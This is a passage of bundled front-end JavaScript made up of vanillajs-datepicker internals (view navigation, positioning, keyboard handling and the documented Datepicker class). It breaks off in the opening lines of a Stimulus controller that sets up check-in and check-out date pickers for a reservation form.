    const { currentView, viewDate } = picker;
    let newViewDate;
    switch (currentView.id) {
      case 0:
        newViewDate = addMonths(viewDate, direction);
        break;
      case 1:
        newViewDate = addYears(viewDate, direction);
        break;
      default:
        newViewDate = addYears(viewDate, direction * currentView.navStep);
    }
    newViewDate = limitToRange(newViewDate, config.minDate, config.maxDate);
    picker.changeFocus(newViewDate).render();
  }
  function switchView(datepicker) {
    const viewId = datepicker.picker.currentView.id;
    if (viewId === datepicker.config.maxView) {
      return;
    }
    datepicker.picker.changeView(viewId + 1).render();
  }
  function clearSelection(datepicker) {
    datepicker.setDate({ clear: true });
  }
  function goToOrSelectToday(datepicker) {
    const currentDate = today();
    if (datepicker.config.todayButtonMode === 1) {
      datepicker.setDate(currentDate, { forceRefresh: true, viewDate: currentDate });
    } else {
      datepicker.setFocusedDate(currentDate, true);
    }
  }
  function unfocus(datepicker) {
    const onBlur = () => {
      if (datepicker.config.updateOnBlur) {
        datepicker.update({ revert: true });
      } else {
        datepicker.refresh("input");
      }
      datepicker.hide();
    };
    const element = datepicker.element;
    if (isActiveElement(element)) {
      element.addEventListener("blur", onBlur, { once: true });
    } else {
      onBlur();
    }
  }

  // node_modules/vanillajs-datepicker/js/events/pickerListeners.js
  function goToSelectedMonthOrYear(datepicker, selection) {
    const picker = datepicker.picker;
    const viewDate = new Date(picker.viewDate);
    const viewId = picker.currentView.id;
    const newDate = viewId === 1 ? addMonths(viewDate, selection - viewDate.getMonth()) : addYears(viewDate, selection - viewDate.getFullYear());
    picker.changeFocus(newDate).changeView(viewId - 1).render();
  }
  function onClickViewSwitch(datepicker) {
    switchView(datepicker);
  }
  function onClickPrevButton(datepicker) {
    goToPrevOrNext(datepicker, -1);
  }
  function onClickNextButton(datepicker) {
    goToPrevOrNext(datepicker, 1);
  }
  function onClickView(datepicker, ev) {
    const target = findElementInEventPath(ev, ".datepicker-cell");
    if (!target || target.classList.contains("disabled")) {
      return;
    }
    const { id, isMinView } = datepicker.picker.currentView;
    const data = target.dataset;
    if (isMinView) {
      datepicker.setDate(Number(data.date));
    } else if (id === 1) {
      goToSelectedMonthOrYear(datepicker, Number(data.month));
    } else {
      goToSelectedMonthOrYear(datepicker, Number(data.year));
    }
  }
  function onMousedownPicker(ev) {
    ev.preventDefault();
  }

  // node_modules/vanillajs-datepicker/js/picker/Picker.js
  var orientClasses = ["left", "top", "right", "bottom"].reduce((obj, key) => {
    obj[key] = `datepicker-orient-${key}`;
    return obj;
  }, {});
  var toPx = (num) => num ? `${num}px` : num;
  function processPickerOptions(picker, options) {
    if ("title" in options) {
      if (options.title) {
        picker.controls.title.textContent = options.title;
        showElement(picker.controls.title);
      } else {
        picker.controls.title.textContent = "";
        hideElement(picker.controls.title);
      }
    }
    if (options.prevArrow) {
      const prevButton = picker.controls.prevButton;
      emptyChildNodes(prevButton);
      options.prevArrow.forEach((node) => {
        prevButton.appendChild(node.cloneNode(true));
      });
    }
    if (options.nextArrow) {
      const nextButton = picker.controls.nextButton;
      emptyChildNodes(nextButton);
      options.nextArrow.forEach((node) => {
        nextButton.appendChild(node.cloneNode(true));
      });
    }
    if (options.locale) {
      picker.controls.todayButton.textContent = options.locale.today;
      picker.controls.clearButton.textContent = options.locale.clear;
    }
    if ("todayButton" in options) {
      if (options.todayButton) {
        showElement(picker.controls.todayButton);
      } else {
        hideElement(picker.controls.todayButton);
      }
    }
    if ("minDate" in options || "maxDate" in options) {
      const { minDate, maxDate } = picker.datepicker.config;
      picker.controls.todayButton.disabled = !isInRange(today(), minDate, maxDate);
    }
    if ("clearButton" in options) {
      if (options.clearButton) {
        showElement(picker.controls.clearButton);
      } else {
        hideElement(picker.controls.clearButton);
      }
    }
  }
  function computeResetViewDate(datepicker) {
    const { dates, config, rangeSideIndex } = datepicker;
    const viewDate = dates.length > 0 ? lastItemOf(dates) : regularizeDate(config.defaultViewDate, config.pickLevel, rangeSideIndex);
    return limitToRange(viewDate, config.minDate, config.maxDate);
  }
  function setViewDate(picker, newDate) {
    if (!("_oldViewDate" in picker) && newDate !== picker.viewDate) {
      picker._oldViewDate = picker.viewDate;
    }
    picker.viewDate = newDate;
    const { id, year, first, last } = picker.currentView;
    const viewYear = new Date(newDate).getFullYear();
    switch (id) {
      case 0:
        return newDate < first || newDate > last;
      case 1:
        return viewYear !== year;
      default:
        return viewYear < first || viewYear > last;
    }
  }
  function getTextDirection(el) {
    return window.getComputedStyle(el).direction;
  }
  function findScrollParents(el) {
    const parent = getParent(el);
    if (parent === document.body || !parent) {
      return;
    }
    return window.getComputedStyle(parent).overflow !== "visible" ? parent : findScrollParents(parent);
  }
  var Picker = class {
    constructor(datepicker) {
      const { config, inputField } = this.datepicker = datepicker;
      const template = pickerTemplate_default.replace(/%buttonClass%/g, config.buttonClass);
      const element = this.element = parseHTML(template).firstChild;
      const [header, main, footer] = element.firstChild.children;
      const title = header.firstElementChild;
      const [prevButton, viewSwitch, nextButton] = header.lastElementChild.children;
      const [todayButton, clearButton] = footer.firstChild.children;
      const controls = {
        title,
        prevButton,
        viewSwitch,
        nextButton,
        todayButton,
        clearButton
      };
      this.main = main;
      this.controls = controls;
      const elementClass = inputField ? "dropdown" : "inline";
      element.classList.add(`datepicker-${elementClass}`);
      processPickerOptions(this, config);
      this.viewDate = computeResetViewDate(datepicker);
      registerListeners(datepicker, [
        [element, "mousedown", onMousedownPicker],
        [main, "click", onClickView.bind(null, datepicker)],
        [controls.viewSwitch, "click", onClickViewSwitch.bind(null, datepicker)],
        [controls.prevButton, "click", onClickPrevButton.bind(null, datepicker)],
        [controls.nextButton, "click", onClickNextButton.bind(null, datepicker)],
        [controls.todayButton, "click", goToOrSelectToday.bind(null, datepicker)],
        [controls.clearButton, "click", clearSelection.bind(null, datepicker)]
      ]);
      this.views = [
        new DaysView(this),
        new MonthsView(this),
        new YearsView(this, { id: 2, name: "years", cellClass: "year", step: 1 }),
        new YearsView(this, { id: 3, name: "decades", cellClass: "decade", step: 10 })
      ];
      this.currentView = this.views[config.startView];
      this.currentView.render();
      this.main.appendChild(this.currentView.element);
      if (config.container) {
        config.container.appendChild(this.element);
      } else {
        inputField.after(this.element);
      }
    }
    setOptions(options) {
      processPickerOptions(this, options);
      this.views.forEach((view) => {
        view.init(options, false);
      });
      this.currentView.render();
    }
    detach() {
      this.element.remove();
    }
    show() {
      if (this.active) {
        return;
      }
      const { datepicker, element } = this;
      const inputField = datepicker.inputField;
      if (inputField) {
        const inputDirection = getTextDirection(inputField);
        if (inputDirection !== getTextDirection(getParent(element))) {
          element.dir = inputDirection;
        } else if (element.dir) {
          element.removeAttribute("dir");
        }
        this.place();
        element.classList.add("active");
        if (datepicker.config.disableTouchKeyboard) {
          inputField.blur();
        }
      } else {
        element.classList.add("active");
      }
      this.active = true;
      triggerDatepickerEvent(datepicker, "show");
    }
    hide() {
      if (!this.active) {
        return;
      }
      this.datepicker.exitEditMode();
      this.element.classList.remove("active");
      this.active = false;
      triggerDatepickerEvent(this.datepicker, "hide");
    }
    place() {
      const { classList, style } = this.element;
      style.display = "block";
      const {
        width: calendarWidth,
        height: calendarHeight
      } = this.element.getBoundingClientRect();
      const offsetParent = this.element.offsetParent;
      style.display = "";
      const { config, inputField } = this.datepicker;
      const {
        left: inputLeft,
        top: inputTop,
        right: inputRight,
        bottom: inputBottom,
        width: inputWidth,
        height: inputHeight
      } = inputField.getBoundingClientRect();
      let { x: orientX, y: orientY } = config.orientation;
      let left = inputLeft;
      let top = inputTop;
      if (offsetParent === document.body || !offsetParent) {
        left += window.scrollX;
        top += window.scrollY;
      } else {
        const offsetParentRect = offsetParent.getBoundingClientRect();
        left -= offsetParentRect.left - offsetParent.scrollLeft;
        top -= offsetParentRect.top - offsetParent.scrollTop;
      }
      const scrollParent = findScrollParents(inputField);
      let scrollAreaLeft = 0;
      let scrollAreaTop = 0;
      let {
        clientWidth: scrollAreaRight,
        clientHeight: scrollAreaBottom
      } = document.documentElement;
      if (scrollParent) {
        const scrollParentRect = scrollParent.getBoundingClientRect();
        if (scrollParentRect.top > 0) {
          scrollAreaTop = scrollParentRect.top;
        }
        if (scrollParentRect.left > 0) {
          scrollAreaLeft = scrollParentRect.left;
        }
        if (scrollParentRect.right < scrollAreaRight) {
          scrollAreaRight = scrollParentRect.right;
        }
        if (scrollParentRect.bottom < scrollAreaBottom) {
          scrollAreaBottom = scrollParentRect.bottom;
        }
      }
      let adjustment = 0;
      if (orientX === "auto") {
        if (inputLeft < scrollAreaLeft) {
          orientX = "left";
          adjustment = scrollAreaLeft - inputLeft;
        } else if (inputLeft + calendarWidth > scrollAreaRight) {
          orientX = "right";
          if (scrollAreaRight < inputRight) {
            adjustment = scrollAreaRight - inputRight;
          }
        } else if (getTextDirection(inputField) === "rtl") {
          orientX = inputRight - calendarWidth < scrollAreaLeft ? "left" : "right";
        } else {
          orientX = "left";
        }
      }
      if (orientX === "right") {
        left += inputWidth - calendarWidth;
      }
      left += adjustment;
      if (orientY === "auto") {
        if (inputTop - calendarHeight > scrollAreaTop) {
          orientY = inputBottom + calendarHeight > scrollAreaBottom ? "top" : "bottom";
        } else {
          orientY = "bottom";
        }
      }
      if (orientY === "top") {
        top -= calendarHeight;
      } else {
        top += inputHeight;
      }
      classList.remove(...Object.values(orientClasses));
      classList.add(orientClasses[orientX], orientClasses[orientY]);
      style.left = toPx(left);
      style.top = toPx(top);
    }
    setViewSwitchLabel(labelText) {
      this.controls.viewSwitch.textContent = labelText;
    }
    setPrevButtonDisabled(disabled) {
      this.controls.prevButton.disabled = disabled;
    }
    setNextButtonDisabled(disabled) {
      this.controls.nextButton.disabled = disabled;
    }
    changeView(viewId) {
      const currentView = this.currentView;
      if (viewId !== currentView.id) {
        if (!this._oldView) {
          this._oldView = currentView;
        }
        this.currentView = this.views[viewId];
        this._renderMethod = "render";
      }
      return this;
    }
    // Change the focused date (view date)
    changeFocus(newViewDate) {
      this._renderMethod = setViewDate(this, newViewDate) ? "render" : "refreshFocus";
      this.views.forEach((view) => {
        view.updateFocus();
      });
      return this;
    }
    // Apply the change of the selected dates
    update(viewDate = void 0) {
      const newViewDate = viewDate === void 0 ? computeResetViewDate(this.datepicker) : viewDate;
      this._renderMethod = setViewDate(this, newViewDate) ? "render" : "refresh";
      this.views.forEach((view) => {
        view.updateFocus();
        view.updateSelection();
      });
      return this;
    }
    // Refresh the picker UI
    render(quickRender = true) {
      const { currentView, datepicker, _oldView: oldView } = this;
      const oldViewDate = new Date(this._oldViewDate);
      const renderMethod = quickRender && this._renderMethod || "render";
      delete this._oldView;
      delete this._oldViewDate;
      delete this._renderMethod;
      currentView[renderMethod]();
      if (oldView) {
        this.main.replaceChild(currentView.element, oldView.element);
        triggerDatepickerEvent(datepicker, "changeView");
      }
      if (!isNaN(oldViewDate)) {
        const newViewDate = new Date(this.viewDate);
        if (newViewDate.getFullYear() !== oldViewDate.getFullYear()) {
          triggerDatepickerEvent(datepicker, "changeYear");
        }
        if (newViewDate.getMonth() !== oldViewDate.getMonth()) {
          triggerDatepickerEvent(datepicker, "changeMonth");
        }
      }
    }
  };

  // node_modules/vanillajs-datepicker/js/events/elementListeners.js
  function findNextAvailableOne(date, addFn, increase, testFn, min, max) {
    if (!isInRange(date, min, max)) {
      return;
    }
    if (testFn(date)) {
      const newDate = addFn(date, increase);
      return findNextAvailableOne(newDate, addFn, increase, testFn, min, max);
    }
    return date;
  }
  function moveByArrowKey(datepicker, direction, vertical) {
    const picker = datepicker.picker;
    const currentView = picker.currentView;
    const step = currentView.step || 1;
    let viewDate = picker.viewDate;
    let addFn;
    switch (currentView.id) {
      case 0:
        viewDate = addDays(viewDate, vertical ? direction * 7 : direction);
        addFn = addDays;
        break;
      case 1:
        viewDate = addMonths(viewDate, vertical ? direction * 4 : direction);
        addFn = addMonths;
        break;
      default:
        viewDate = addYears(viewDate, direction * (vertical ? 4 : 1) * step);
        addFn = addYears;
    }
    viewDate = findNextAvailableOne(
      viewDate,
      addFn,
      direction < 0 ? -step : step,
      (date) => currentView.disabled.includes(date),
      currentView.minDate,
      currentView.maxDate
    );
    if (viewDate !== void 0) {
      picker.changeFocus(viewDate).render();
    }
  }
  function onKeydown(datepicker, ev) {
    const { config, picker, editMode } = datepicker;
    const active = picker.active;
    const { key, altKey, shiftKey } = ev;
    const ctrlOrMetaKey = ev.ctrlKey || ev.metaKey;
    const cancelEvent = () => {
      ev.preventDefault();
      ev.stopPropagation();
    };
    if (key === "Tab") {
      unfocus(datepicker);
      return;
    }
    if (key === "Enter") {
      if (!active) {
        datepicker.update();
      } else if (editMode) {
        datepicker.exitEditMode({ update: true, autohide: config.autohide });
      } else {
        const currentView = picker.currentView;
        if (currentView.isMinView) {
          datepicker.setDate(picker.viewDate);
        } else {
          picker.changeView(currentView.id - 1).render();
          cancelEvent();
        }
      }
      return;
    }
    const shortcutKeys = config.shortcutKeys;
    const keyInfo = { key, ctrlOrMetaKey, altKey, shiftKey };
    const shortcut = Object.keys(shortcutKeys).find((item) => {
      const keyDef = shortcutKeys[item];
      return !Object.keys(keyDef).find((prop) => keyDef[prop] !== keyInfo[prop]);
    });
    if (shortcut) {
      let action;
      if (shortcut === "toggle") {
        action = shortcut;
      } else if (editMode) {
        if (shortcut === "exitEditMode") {
          action = shortcut;
        }
      } else if (active) {
        if (shortcut === "hide") {
          action = shortcut;
        } else if (shortcut === "prevButton") {
          action = [goToPrevOrNext, [datepicker, -1]];
        } else if (shortcut === "nextButton") {
          action = [goToPrevOrNext, [datepicker, 1]];
        } else if (shortcut === "viewSwitch") {
          action = [switchView, [datepicker]];
        } else if (config.clearButton && shortcut === "clearButton") {
          action = [clearSelection, [datepicker]];
        } else if (config.todayButton && shortcut === "todayButton") {
          action = [goToOrSelectToday, [datepicker]];
        }
      } else if (shortcut === "show") {
        action = shortcut;
      }
      if (action) {
        if (Array.isArray(action)) {
          action[0].apply(null, action[1]);
        } else {
          datepicker[action]();
        }
        cancelEvent();
        return;
      }
    }
    if (!active || editMode) {
      return;
    }
    const handleArrowKeyPress = (direction, vertical) => {
      if (shiftKey || ctrlOrMetaKey || altKey) {
        datepicker.enterEditMode();
      } else {
        moveByArrowKey(datepicker, direction, vertical);
        ev.preventDefault();
      }
    };
    if (key === "ArrowLeft") {
      handleArrowKeyPress(-1, false);
    } else if (key === "ArrowRight") {
      handleArrowKeyPress(1, false);
    } else if (key === "ArrowUp") {
      handleArrowKeyPress(-1, true);
    } else if (key === "ArrowDown") {
      handleArrowKeyPress(1, true);
    } else if (key === "Backspace" || key === "Delete" || key && key.length === 1 && !ctrlOrMetaKey) {
      datepicker.enterEditMode();
    }
  }
  function onFocus(datepicker) {
    if (datepicker.config.showOnFocus && !datepicker._showing) {
      datepicker.show();
    }
  }
  function onMousedown(datepicker, ev) {
    const el = ev.target;
    if (datepicker.picker.active || datepicker.config.showOnClick) {
      el._active = isActiveElement(el);
      el._clicking = setTimeout(() => {
        delete el._active;
        delete el._clicking;
      }, 2e3);
    }
  }
  function onClickInput(datepicker, ev) {
    const el = ev.target;
    if (!el._clicking) {
      return;
    }
    clearTimeout(el._clicking);
    delete el._clicking;
    if (el._active) {
      datepicker.enterEditMode();
    }
    delete el._active;
    if (datepicker.config.showOnClick) {
      datepicker.show();
    }
  }
  function onPaste(datepicker, ev) {
    if (ev.clipboardData.types.includes("text/plain")) {
      datepicker.enterEditMode();
    }
  }

  // node_modules/vanillajs-datepicker/js/events/otherListeners.js
  function onClickOutside(datepicker, ev) {
    const { element, picker } = datepicker;
    if (!picker.active && !isActiveElement(element)) {
      return;
    }
    const pickerElem = picker.element;
    if (findElementInEventPath(ev, (el) => el === element || el === pickerElem)) {
      return;
    }
    unfocus(datepicker);
  }

  // node_modules/vanillajs-datepicker/js/Datepicker.js
  function stringifyDates(dates, config) {
    return dates.map((dt) => formatDate(dt, config.format, config.locale)).join(config.dateDelimiter);
  }
  function processInputDates(datepicker, inputDates, clear = false) {
    if (inputDates.length === 0) {
      return clear ? [] : void 0;
    }
    const { config, dates: origDates, rangeSideIndex } = datepicker;
    const { pickLevel, maxNumberOfDates } = config;
    let newDates = inputDates.reduce((dates, dt) => {
      let date = parseDate(dt, config.format, config.locale);
      if (date === void 0) {
        return dates;
      }
      date = regularizeDate(date, pickLevel, rangeSideIndex);
      if (isInRange(date, config.minDate, config.maxDate) && !dates.includes(date) && !config.checkDisabled(date, pickLevel) && (pickLevel > 0 || !config.daysOfWeekDisabled.includes(new Date(date).getDay()))) {
        dates.push(date);
      }
      return dates;
    }, []);
    if (newDates.length === 0) {
      return;
    }
    if (config.multidate && !clear) {
      newDates = newDates.reduce((dates, date) => {
        if (!origDates.includes(date)) {
          dates.push(date);
        }
        return dates;
      }, origDates.filter((date) => !newDates.includes(date)));
    }
    return maxNumberOfDates && newDates.length > maxNumberOfDates ? newDates.slice(maxNumberOfDates * -1) : newDates;
  }
  function refreshUI(datepicker, mode = 3, quickRender = true, viewDate = void 0) {
    const { config, picker, inputField } = datepicker;
    if (mode & 2) {
      const newView = picker.active ? config.pickLevel : config.startView;
      picker.update(viewDate).changeView(newView).render(quickRender);
    }
    if (mode & 1 && inputField) {
      inputField.value = stringifyDates(datepicker.dates, config);
    }
  }
  function setDate(datepicker, inputDates, options) {
    const config = datepicker.config;
    let { clear, render, autohide, revert, forceRefresh, viewDate } = options;
    if (render === void 0) {
      render = true;
    }
    if (!render) {
      autohide = forceRefresh = false;
    } else if (autohide === void 0) {
      autohide = config.autohide;
    }
    viewDate = parseDate(viewDate, config.format, config.locale);
    const newDates = processInputDates(datepicker, inputDates, clear);
    if (!newDates && !revert) {
      return;
    }
    if (newDates && newDates.toString() !== datepicker.dates.toString()) {
      datepicker.dates = newDates;
      refreshUI(datepicker, render ? 3 : 1, true, viewDate);
      triggerDatepickerEvent(datepicker, "changeDate");
    } else {
      refreshUI(datepicker, forceRefresh ? 3 : 1, true, viewDate);
    }
    if (autohide) {
      datepicker.hide();
    }
  }
  function getOutputConverter(datepicker, format) {
    return format ? (date) => formatDate(date, format, datepicker.config.locale) : (date) => new Date(date);
  }
  var Datepicker = class {
    /**
     * Create a date picker
     * @param  {Element} element - element to bind a date picker
     * @param  {Object} [options] - config options
     * @param  {DateRangePicker} [rangepicker] - DateRangePicker instance the
     * date picker belongs to. Use this only when creating date picker as a part
     * of date range picker
     */
    constructor(element, options = {}, rangepicker = void 0) {
      element.datepicker = this;
      this.element = element;
      this.dates = [];
      const config = this.config = Object.assign({
        buttonClass: options.buttonClass && String(options.buttonClass) || "button",
        container: null,
        defaultViewDate: today(),
        maxDate: void 0,
        minDate: void 0
      }, processOptions(defaultOptions_default, this));
      let inputField;
      if (element.tagName === "INPUT") {
        inputField = this.inputField = element;
        inputField.classList.add("datepicker-input");
        if (options.container) {
          config.container = options.container instanceof HTMLElement ? options.container : document.querySelector(options.container);
        }
      } else {
        config.container = element;
      }
      if (rangepicker) {
        const index = rangepicker.inputs.indexOf(inputField);
        const datepickers = rangepicker.datepickers;
        if (index < 0 || index > 1 || !Array.isArray(datepickers)) {
          throw Error("Invalid rangepicker object.");
        }
        datepickers[index] = this;
        this.rangepicker = rangepicker;
        this.rangeSideIndex = index;
      }
      this._options = options;
      Object.assign(config, processOptions(options, this));
      config.shortcutKeys = createShortcutKeyConfig(options.shortcutKeys || {});
      const initialDates = stringToArray(
        element.value || element.dataset.date,
        config.dateDelimiter
      );
      delete element.dataset.date;
      const inputDateValues = processInputDates(this, initialDates);
      if (inputDateValues && inputDateValues.length > 0) {
        this.dates = inputDateValues;
      }
      if (inputField) {
        inputField.value = stringifyDates(this.dates, config);
      }
      const picker = this.picker = new Picker(this);
      const keydownListener = [element, "keydown", onKeydown.bind(null, this)];
      if (inputField) {
        registerListeners(this, [
          keydownListener,
          [inputField, "focus", onFocus.bind(null, this)],
          [inputField, "mousedown", onMousedown.bind(null, this)],
          [inputField, "click", onClickInput.bind(null, this)],
          [inputField, "paste", onPaste.bind(null, this)],
          // To detect a click on outside, just listening to mousedown is enough,
          // no need to listen to touchstart.
          // Actually, listening to touchstart can be a problem because, while
          // mousedown is fired only on tapping but not on swiping/pinching,
          // touchstart is fired on swiping/pinching as well.
          // (issue #95)
          [document, "mousedown", onClickOutside.bind(null, this)],
          [window, "resize", picker.place.bind(picker)]
        ]);
      } else {
        registerListeners(this, [keydownListener]);
        this.show();
      }
    }
    /**
     * Format Date object or time value in given format and language
     * @param  {Date|Number} date - date or time value to format
     * @param  {String|Object} format - format string or object that contains
     * toDisplay() custom formatter, whose signature is
     * - args:
     *   - date: {Date} - Date instance of the date passed to the method
     *   - format: {Object} - the format object passed to the method
     *   - locale: {Object} - locale for the language specified by `lang`
     * - return:
     *     {String} formatted date
     * @param  {String} [lang=en] - language code for the locale to use
     * @return {String} formatted date
     */
    static formatDate(date, format, lang) {
      return formatDate(date, format, lang && base_locales_default[lang] || base_locales_default.en);
    }
    /**
     * Parse date string
     * @param  {String|Date|Number} dateStr - date string, Date object or time
     * value to parse
     * @param  {String|Object} format - format string or object that contains
     * toValue() custom parser, whose signature is
     * - args:
     *   - dateStr: {String|Date|Number} - the dateStr passed to the method
     *   - format: {Object} - the format object passed to the method
     *   - locale: {Object} - locale for the language specified by `lang`
     * - return:
     *     {Date|Number} parsed date or its time value
     * @param  {String} [lang=en] - language code for the locale to use
     * @return {Number} time value of parsed date
     */
    static parseDate(dateStr, format, lang) {
      return parseDate(dateStr, format, lang && base_locales_default[lang] || base_locales_default.en);
    }
    /**
     * @type {Object} - Installed locales in `[languageCode]: localeObject` format
     * en`:_English (US)_ is pre-installed.
     */
    static get locales() {
      return base_locales_default;
    }
    /**
     * @type {Boolean} - Whether the picker element is shown. `true` whne shown
     */
    get active() {
      return !!(this.picker && this.picker.active);
    }
    /**
     * @type {HTMLDivElement} - DOM object of picker element
     */
    get pickerElement() {
      return this.picker ? this.picker.element : void 0;
    }
    /**
     * Set new values to the config options
     * @param {Object} options - config options to update
     */
    setOptions(options) {
      const newOptions = processOptions(options, this);
      Object.assign(this._options, options);
      Object.assign(this.config, newOptions);
      this.picker.setOptions(newOptions);
      refreshUI(this, 3);
    }
    /**
     * Show the picker element
     */
    show() {
      if (this.inputField) {
        const { config, inputField } = this;
        if (inputField.disabled || inputField.readOnly && !config.enableOnReadonly) {
          return;
        }
        if (!isActiveElement(inputField) && !config.disableTouchKeyboard) {
          this._showing = true;
          inputField.focus();
          delete this._showing;
        }
      }
      this.picker.show();
    }
    /**
     * Hide the picker element
     * Not available on inline picker
     */
    hide() {
      if (!this.inputField) {
        return;
      }
      this.picker.hide();
      this.picker.update().changeView(this.config.startView).render();
    }
    /**
     * Toggle the display of the picker element
     * Not available on inline picker
     *
     * Unlike hide(), the picker does not return to the start view when hiding.
     */
    toggle() {
      if (!this.picker.active) {
        this.show();
      } else if (this.inputField) {
        this.picker.hide();
      }
    }
    /**
     * Destroy the Datepicker instance
     * @return {Detepicker} - the instance destroyed
     */
    destroy() {
      this.hide();
      unregisterListeners(this);
      this.picker.detach();
      const element = this.element;
      element.classList.remove("datepicker-input");
      delete element.datepicker;
      return this;
    }
    /**
     * Get the selected date(s)
     *
     * The method returns a Date object of selected date by default, and returns
     * an array of selected dates in multidate mode. If format string is passed,
     * it returns date string(s) formatted in given format.
     *
     * @param  {String} [format] - format string to stringify the date(s)
     * @return {Date|String|Date[]|String[]} - selected date(s), or if none is
     * selected, empty array in multidate mode and undefined in sigledate mode
     */
    getDate(format = void 0) {
      const callback = getOutputConverter(this, format);
      if (this.config.multidate) {
        return this.dates.map(callback);
      }
      if (this.dates.length > 0) {
        return callback(this.dates[0]);
      }
    }
    /**
     * Set selected date(s)
     *
     * In multidate mode, you can pass multiple dates as a series of arguments
     * or an array. (Since each date is parsed individually, the type of the
     * dates doesn't have to be the same.)
     * The given dates are used to toggle the select status of each date. The
     * number of selected dates is kept from exceeding the length set to
     * maxNumberOfDates.
     *
     * With clear: true option, the method can be used to clear the selection
     * and to replace the selection instead of toggling in multidate mode.
     * If the option is passed with no date arguments or an empty dates array,
     * it works as "clear" (clear the selection then set nothing), and if the
     * option is passed with new dates to select, it works as "replace" (clear
     * the selection then set the given dates)
     *
     * When render: false option is used, the method omits re-rendering the
     * picker element. In this case, you need to call refresh() method later in
     * order for the picker element to reflect the changes. The input field is
     * refreshed always regardless of this option.
     *
     * When invalid (unparsable, repeated, disabled or out-of-range) dates are
     * passed, the method ignores them and applies only valid ones. In the case
     * that all the given dates are invalid, which is distinguished from passing
     * no dates, the method considers it as an error and leaves the selection
     * untouched. (The input field also remains untouched unless revert: true
     * option is used.)
     * Replacing the selection with the same date(s) also causes a similar
     * situation. In both cases, the method does not refresh the picker element
     * unless forceRefresh: true option is used.
     *
     * If viewDate option is used, the method changes the focused date to the
     * specified date instead of the last item of the selection.
     *
     * @param {...(Date|Number|String)|Array} [dates] - Date strings, Date
     * objects, time values or mix of those for new selection
     * @param {Object} [options] - function options
     * - clear: {boolean} - Whether to clear the existing selection
     *     defualt: false
     * - render: {boolean} - Whether to re-render the picker element
     *     default: true
     * - autohide: {boolean} - Whether to hide the picker element after re-render
     *     Ignored when used with render: false
     *     default: config.autohide
     * - revert: {boolean} - Whether to refresh the input field when all the
     *     passed dates are invalid
     *     default: false
     * - forceRefresh: {boolean} - Whether to refresh the picker element when
     *     passed dates don't change the existing selection
     *     default: false
     * - viewDate: {Date|Number|String} - Date to be focused after setiing date(s)
     *     default: The last item of the resulting selection, or defaultViewDate
     *     config option if none is selected
     */
    setDate(...args) {
      const dates = [...args];
      const opts = {};
      const lastArg = lastItemOf(args);
      if (lastArg && typeof lastArg === "object" && !Array.isArray(lastArg) && !(lastArg instanceof Date)) {
        Object.assign(opts, dates.pop());
      }
      const inputDates = Array.isArray(dates[0]) ? dates[0] : dates;
      setDate(this, inputDates, opts);
    }
    /**
     * Update the selected date(s) with input field's value
     * Not available on inline picker
     *
     * The input field will be refreshed with properly formatted date string.
     *
     * In the case that all the entered dates are invalid (unparsable, repeated,
     * disabled or out-of-range), which is distinguished from empty input field,
     * the method leaves the input field untouched as well as the selection by
     * default. If revert: true option is used in this case, the input field is
     * refreshed with the existing selection.
     * The method also doesn't refresh the picker element in this case and when
     * the entered dates are the same as the existing selection. If
     * forceRefresh: true option is used, the picker element is refreshed in
     * these cases too.
     *
     * @param  {Object} [options] - function options
     * - autohide: {boolean} - whether to hide the picker element after refresh
     *     default: false
     * - revert: {boolean} - Whether to refresh the input field when all the
     *     passed dates are invalid
     *     default: false
     * - forceRefresh: {boolean} - Whether to refresh the picer element when
     *     input field's value doesn't change the existing selection
     *     default: false
     */
    update(options = void 0) {
      if (!this.inputField) {
        return;
      }
      const opts = Object.assign(options || {}, { clear: true, render: true, viewDate: void 0 });
      const inputDates = stringToArray(this.inputField.value, this.config.dateDelimiter);
      setDate(this, inputDates, opts);
    }
    /**
     * Get the focused date
     *
     * The method returns a Date object of focused date by default. If format
     * string is passed, it returns date string formatted in given format.
     *
     * @param  {String} [format] - format string to stringify the date
     * @return {Date|String} - focused date (viewDate)
     */
    getFocusedDate(format = void 0) {
      return getOutputConverter(this, format)(this.picker.viewDate);
    }
    /**
     * Set focused date
     *
     * By default, the method updates the focus on the view shown at the time,
     * or the one set to the startView config option if the picker is hidden.
     * When resetView: true is passed, the view displayed is changed to the
     * pickLevel config option's if the picker is shown.
     *
     * @param {Date|Number|String} viewDate - date string, Date object, time
     * values of the date to focus
     * @param {Boolean} [resetView] - whether to change the view to pickLevel
     * config option's when the picker is shown. Ignored when the picker is
     * hidden
     */
    setFocusedDate(viewDate, resetView = false) {
      const { config, picker, active, rangeSideIndex } = this;
      const pickLevel = config.pickLevel;
      const newViewDate = parseDate(viewDate, config.format, config.locale);
      if (newViewDate === void 0) {
        return;
      }
      picker.changeFocus(regularizeDate(newViewDate, pickLevel, rangeSideIndex));
      if (active && resetView) {
        picker.changeView(pickLevel);
      }
      picker.render();
    }
    /**
     * Refresh the picker element and the associated input field
     * @param {String} [target] - target item when refreshing one item only
     * 'picker' or 'input'
     * @param {Boolean} [forceRender] - whether to re-render the picker element
     * regardless of its state instead of optimized refresh
     */
    refresh(target = void 0, forceRender = false) {
      if (target && typeof target !== "string") {
        forceRender = target;
        target = void 0;
      }
      let mode;
      if (target === "picker") {
        mode = 2;
      } else if (target === "input") {
        mode = 1;
      } else {
        mode = 3;
      }
      refreshUI(this, mode, !forceRender);
    }
    /**
     * Enter edit mode
     * Not available on inline picker or when the picker element is hidden
     */
    enterEditMode() {
      const inputField = this.inputField;
      if (!inputField || inputField.readOnly || !this.picker.active || this.editMode) {
        return;
      }
      this.editMode = true;
      inputField.classList.add("in-edit");
    }
    /**
     * Exit from edit mode
     * Not available on inline picker
     * @param  {Object} [options] - function options
     * - update: {boolean} - whether to call update() after exiting
     *     If false, input field is revert to the existing selection
     *     default: false
     */
    exitEditMode(options = void 0) {
      if (!this.inputField || !this.editMode) {
        return;
      }
      const opts = Object.assign({ update: false }, options);
      delete this.editMode;
      this.inputField.classList.remove("in-edit");
      if (opts.update) {
        this.update(opts);
      }
    }
  };

  // app/javascript/controllers/reservation_component_controller.js
  var import_sweetalert2 = __toESM(require_sweetalert2_all());
  var reservation_component_controller_default = class extends Controller {
    static targets = ["checkin", "checkout", "numOfNights", "nightlyTotal", "serviceFee", "total"];
    connect() {
      this.checkinPicker = new Datepicker(this.checkinTarget, {
        minDate: this.element.dataset.defaultCheckinDate
      });
      this.checkoutPicker = new Datepicker(this.checkoutTarget, {
        minDate: this.element.dataset.defaultCheckoutDate
      });
      this.checkinTarget.addEventListener("changeDate", (e) => {
        const date = new Date(e.target.value);
        date.setDate(date.getDate() + 1);
        this.checkoutPicker.setOptions({
          minDate: date
        });
